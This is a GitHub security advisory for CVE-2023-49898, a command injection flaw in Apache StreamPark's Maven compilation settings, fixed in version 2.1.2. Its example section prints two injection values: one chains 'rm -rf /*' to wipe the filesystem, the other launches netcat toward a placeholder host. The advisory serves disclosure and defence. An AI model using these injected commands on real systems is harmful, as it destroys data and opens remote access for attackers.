# [C] Apache StreamPark: Authenticated system users could trigger remote command execution

## Summary
Severity: Critical
Advisory: GHSA-qg44-xqwj-wc28
CVE: CVE-2023-49898
CWE: CWE-77
Ecosystem: Maven
Published: 2023-12-15
Source: https://github.com/advisories/GHSA-qg44-xqwj-wc28
Type: github-advisory

## Affected
- Maven: `org.apache.streampark:streampark` — affected >=2.0.0 <2.1.2

## Details
In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.

Mitigation:

all users should upgrade to 2.1.2

Example:

##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &&, compilation failure use "||" or "&&":

/usr/share/java/maven-3/conf/settings.xml || rm -rf /*

/usr/share/java/maven-3/conf/settings.xml && nohup nc x.x.x.x 8899 &

## References
- https://nvd.nist.gov/vuln/detail/CVE-2023-49898
- https://github.com/apache/incubator-streampark
- https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3
